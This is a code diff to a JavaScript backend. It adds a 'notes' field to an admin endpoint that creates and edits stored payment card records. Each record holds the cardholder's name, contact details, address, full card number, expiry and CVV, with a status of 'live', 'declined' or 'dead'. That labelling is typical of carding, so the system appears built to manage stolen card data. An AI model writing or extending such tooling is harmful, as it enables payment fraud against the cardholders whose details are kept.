@@ -2139,7 +2139,7 @@ export function createBackend({ store, fetchFn, cacheMs = 0, mode = 'server' }) 
       }
       if (R('POST', '/api/admin/cc')) {
         const status = ['live', 'declined', 'dead'].includes(body.status) ? body.status : 'live';
-        const rec = { id: uid(8), at: Date.now(), by: actorName, fullName: cleanText(body.fullName, 80), email: cleanEmail(body.email || ''), phone: cleanText(body.phone, 40), address: cleanText(body.address, 300), cardNumber: String(body.cardNumber || '').replace(/\D/g, '').slice(0, 16), exp: String(body.exp || '').replace(/[^0-9]/g, '').slice(0, 6), cvv: String(body.cvv || '').replace(/\D/g, '').slice(0, 4), status };
+        const rec = { id: uid(8), at: Date.now(), by: actorName, fullName: cleanText(body.fullName, 80), email: cleanEmail(body.email || ''), phone: cleanText(body.phone, 40), address: cleanText(body.address, 300), cardNumber: String(body.cardNumber || '').replace(/\D/g, '').slice(0, 16), exp: String(body.exp || '').replace(/[^0-9]/g, '').slice(0, 6), cvv: String(body.cvv || '').replace(/\D/g, '').slice(0, 4), notes: cleanText(body.notes || '', 300), status };
         if (!rec.fullName) return err(400, 'Full name is required.');
         if (rec.cardNumber.length !== 16) return err(400, 'Card number must be 16 digits.');
         const list = await getCc(); list.unshift(rec); await saveCc(list);
@@ -2158,6 +2158,7 @@ export function createBackend({ store, fetchFn, cacheMs = 0, mode = 'server' }) 
         if (body.cardNumber !== undefined) { const cn = String(body.cardNumber || '').replace(/\D/g, '').slice(0, 16); if (cn.length !== 16) return err(400, 'Card number must be 16 digits.'); rec.cardNumber = cn; }
         if (body.exp !== undefined) rec.exp = String(body.exp || '').replace(/[^0-9]/g, '').slice(0, 6);
         if (body.cvv !== undefined) rec.cvv = String(body.cvv || '').replace(/\D/g, '').slice(0, 4);
+        if (body.notes !== undefined) rec.notes = cleanText(body.notes, 300);
         if (body.status !== undefined) { if (!['live', 'declined', 'dead'].includes(body.status)) return err(400, 'Card status must be Live, Declined or Dead.'); rec.status = body.status; }
         if (!rec.fullName) return err(400, 'Full name is required.');
         rec.at = Date.now(); list[idx] = rec; await saveCc(list); return ok({ ok: true, record: rec });
